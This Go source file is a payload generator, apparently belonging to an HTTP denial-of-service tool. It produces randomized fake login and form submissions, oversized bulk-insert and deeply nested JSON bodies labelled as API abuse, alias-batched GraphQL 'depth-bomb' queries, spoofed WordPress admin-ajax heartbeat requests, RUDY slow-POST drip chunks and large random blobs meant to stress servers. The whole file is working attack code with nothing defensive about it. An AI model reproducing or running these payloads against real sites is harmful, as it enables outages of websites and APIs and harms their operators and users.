package payload

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"strconv"
	"strings"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var apiActions = []string{"update_profile", "create_post", "send_message", "add_comment", "upload_data", "sync", "validate"}
var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit", "/api/v1/auth", "/api/v1/search"}

func RandString(n int) string {
	if n <= 0 {
		return ""
	}
	b := make([]byte, n)
	for i := range b {
		v, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		b[i] = charset[v.Int64()]
	}
	return string(b)
}

func RandEmail() string {
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "example.com"}
	return RandString(8+intN(12)) + "@" + domains[intN(len(domains))]
}

func intN(max int) int {
	if max <= 0 {
		return 0
	}
	v, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(v.Int64())
}

// FormPayload returns a randomized form body and content type.
func FormPayload() (body, contentType string) {
	if intN(6) == 0 {
		return LargeBlob()
	}
	if intN(4) == 0 {
		json := fmt.Sprintf(
			`{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
			RandEmail(), RandString(16+intN(32)), RandString(64), RandString(200+intN(1000)),
		)
		return json, "application/json"
	}

	switch intN(4) {
	case 0:
		body = "username=" + RandString(8+intN(16)) +
			"&password=" + RandString(12+intN(20)) +
			"&email=" + RandEmail() +
			"&csrf_token=" + RandString(32)
	case 1:
		body = "search=" + RandString(20+intN(200)) +
			"&category=" + RandString(5) +
			"&page=" + strconv.Itoa(intN(500)) +
			"&submit=Search"
	case 2:
		body = "name=" + RandString(10) +
			"&email=" + RandEmail() +
			"&subject=" + RandString(20+intN(40)) +
			"&message=" + RandString(200+intN(2000)) +
			"&token=" + RandString(64)
	default:
		var sb strings.Builder
		n := 50 + intN(150)
		for i := 0; i < n; i++ {
			if i > 0 {
				sb.WriteByte('&')
			}
			sb.WriteString(RandString(3 + intN(8)))
			sb.WriteByte('=')
			sb.WriteString(RandString(5 + intN(30)))
		}
		body = sb.String()
	}
	return body, "application/x-www-form-urlencoded"
}

// APIPayload returns a JSON API abuse body and path suffix.
func APIPayload() (pathSuffix, body string) {
	pathSuffix = apiEndpoints[intN(len(apiEndpoints))]
	switch intN(5) {
	case 0:
		body = fmt.Sprintf(
			`{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s"}`,
			intN(9999999), apiActions[intN(len(apiActions))],
			RandString(2000+intN(8000)), RandString(32), RandEmail(),
		)
	case 1:
		var sb strings.Builder
		n := 500 + intN(4500)
		sb.WriteString(`{"action":"bulk_insert","token":"`)
		sb.WriteString(RandString(64))
		sb.WriteString(`","items":[`)
		for i := 0; i < n; i++ {
			if i > 0 {
				sb.WriteByte(',')
			}
			fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
				intN(9999999), RandString(8+intN(16)), RandString(20+intN(100)))
		}
		sb.WriteString(`]}`)
		body = sb.String()
	case 2:
		depth := 25 + intN(35)
		var sb strings.Builder
		for i := 0; i < depth; i++ {
			fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, RandString(50+intN(200)))
		}
		sb.WriteString(`{"end":true}`)
		for i := 0; i < depth; i++ {
			sb.WriteString(`}}`)
		}
		body = sb.String()
	case 3:
		body = fmt.Sprintf(
			`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s"}}}`,
			intN(9999999), RandString(16), RandString(3000+intN(5000)),
		)
	default:
		body = fmt.Sprintf(
			`{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s"}`,
			RandEmail(), RandString(16+intN(32)), intN(999999), RandString(36),
		)
	}
	return pathSuffix, body
}

// GraphQLBody returns a depth-bomb style GraphQL POST body with alias batching.
func GraphQLBody() string {
	aliases := 20 + intN(40)
	depth := 8 + intN(12)
	var sb strings.Builder
	sb.WriteString(`{"query":"`)
	for i := 0; i < aliases; i++ {
		if i > 0 {
			sb.WriteString(" ")
		}
		fmt.Fprintf(&sb, `a%d: viewer { id posts(first:%d) { edges { node { id title `, i, 50+intN(150))
		for d := 0; d < depth; d++ {
			sb.WriteString(`related { `)
		}
		sb.WriteString(`body }`)
		for d := 0; d < depth; d++ {
			sb.WriteString(` }`)
		}
		sb.WriteString(` } } }`)
	}
	sb.WriteString(`","variables":{}}`)
	return sb.String()
}

// WordPressHeartbeat returns a realistic admin-ajax heartbeat POST body.
func WordPressHeartbeat() string {
	return fmt.Sprintf(
		"action=heartbeat&_nonce=%s&interval=15&data[wp-auth-check]=true&data[screen_id]=dashboard&data[has_focus]=true&data[wp-refresh-post-lock][post_id]=%d",
		RandString(10), intN(99999),
	)
}

// RudyChunk is a small repeating chunk for slow POST drip.
func RudyChunk() []byte {
	return []byte("comment=" + RandString(50) + "&field=" + RandString(20) + "&")
}

// LargeBlob returns a base64 form field for POST stress.
func LargeBlob() (body, contentType string) {
	size := 10240 + intN(40960)
	blob := make([]byte, size)
	rand.Read(blob)
	return "data=" + base64.StdEncoding.EncodeToString(blob), "application/x-www-form-urlencoded"
}